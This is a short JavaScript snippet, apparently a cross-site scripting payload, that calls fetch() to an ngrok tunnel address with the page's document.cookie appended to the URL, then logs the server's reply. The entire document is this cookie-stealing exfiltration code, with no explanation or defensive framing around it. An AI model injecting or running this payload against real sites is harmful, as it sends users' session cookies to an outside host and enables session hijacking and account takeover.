fetch('https://fd820e801b58.ngrok-free.app/'+document.cookie, {method: 'GET', mode:'no-cors'})
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.text(); 
  })
  .then(data => {
    console.log('Server response:', data);
  })
  .catch(error => {
    console.error('Request failed:', error);
  });
